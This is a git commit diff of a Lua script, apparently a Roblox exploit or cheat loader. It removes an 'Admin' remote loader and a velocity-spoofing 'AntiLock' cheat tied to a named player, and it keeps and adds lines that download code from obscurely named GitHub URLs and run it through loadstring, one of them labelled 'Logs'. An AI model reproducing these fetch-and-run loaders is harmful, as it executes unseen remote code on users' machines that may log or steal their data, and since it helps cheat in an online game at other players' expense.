2686a4b5c453de44df0e1b74a0b0680da880110c
fdsmogk <121389294+fdsmogk@users.noreply.github.com>
2023-02-03 18:41:34 +0500

    Update lllalallala.lua

--- lllalallala.lua
+++ lllalallala.lua
@@ -4,19 +4,5 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/aehtnpopoaoer
 --Logs
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/wgrijndsapmoioiesrdmvipso324326523523/main/sfasfdrhadfgsad3253467457sdfgdfshfdhjj", true))()
 
---Admin
-wait(5)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/sgzhdsxhsrt6745745joinijodnoizsd25/main/sdhdfjherajserk6346347cdzs", true))()
-
---AntiLock
-getgenv().Sky = true 
-getgenv().SkyAmount = 100000000000000000000000000
-
-game:GetService("RunService").heartbeat:Connect(function()
-    if getgenv().Sky ~= false then 
-    local vel = game.Workspace.Players.KreepOZi.HumanoidRootPart.Velocity
-    game.Workspace.Players.KreepOZi.HumanoidRootPart.Velocity = Vector3.new(0,      getgenv().SkyAmount,0) 
-    game:GetService("RunService").RenderStepped:Wait()
-    game.Workspace.Players.KreepOZi.HumanoidRootPart.Velocity = vel
-    end 
-end)
+--Other
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/htsrshtroipndsoijdshtjoihdtsff0hoihjsi/main/fjfszfjtsjdtzsj", true))()
